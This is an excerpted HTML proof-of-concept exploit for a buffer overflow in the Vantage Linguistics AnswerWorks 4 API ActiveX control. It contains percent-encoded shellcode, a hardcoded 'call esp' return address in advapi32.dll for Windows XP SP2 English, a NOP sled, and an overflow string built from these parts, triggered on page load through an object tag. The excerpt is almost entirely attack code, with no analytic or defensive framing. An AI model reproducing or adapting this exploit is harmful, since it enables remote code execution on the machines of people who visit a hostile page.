...
<html>
 <head>
  <title>Vantage Linguistics AnswerWorks 4 API ActiveX Control Buffer 
Overflow Exploit</title>
...
"%6f%4e%30%63%58%6c%30%6f%7a%57%74%61%4f%32%73%4b" +
        ...
        var eip = unescape("%2B%1C%E1%77"); //advapi32.dll Windows XP SP2 English 0x77E11C2B call esp

        var nop = unescape("%90%90%90%90%90%90%90%90%90%90%90%90");

        var m = buf + eip + nop + shellcode2 + nop;
 ...
 <body onload="JavaScript: return Check();">
    <object id="obj" 
classid="clsid:C1908682-7B2C-4AB0-B98E-183649A0BF84">
